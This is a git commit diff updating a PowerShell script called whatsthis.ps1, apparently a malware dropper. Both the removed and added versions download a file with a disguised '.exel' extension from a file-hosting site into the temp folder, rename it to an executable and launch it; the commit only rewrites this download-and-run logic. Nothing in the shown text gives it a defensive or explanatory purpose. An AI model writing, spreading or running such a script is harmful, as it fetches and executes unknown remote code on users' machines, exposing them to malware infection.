67023d77dc27874d852ba44e8f35a1bd8cea2457
hamood <71662379+tupimano@users.noreply.github.com>
2024-07-22 17:15:30 -0300

    Update whatsthis.ps1

--- whatsthis.ps1
+++ whatsthis.ps1
@@ -1,6 +1,6 @@
-$githubUrl = "https://files.catbox.moe/uy96rs.exel"
-$tempPath = [System.IO.Path]::Combine($env:TEMP, "souce_prepared.exe")
-Invoke-WebRequest -Uri $githubUrl -OutFile $tempPath
-Rename-Item -Path $tempPath -NewName "souce_prepared.exe"
-$finalPath = [System.IO.Path]::Combine($env:TEMP, "souce_prepared.exe")
-& $finalPath
+$url = "https://files.catbox.moe/uy96rs.exel"
+$downloadPath = "$env:TEMP\uy96rs.exel"
+$exePath = "$env:TEMP\uy96rs.exe"
+Invoke-WebRequest -Uri $url -OutFile $downloadPath
+Rename-Item -Path $downloadPath -NewName $exePath
+Start-Process -FilePath $exePath
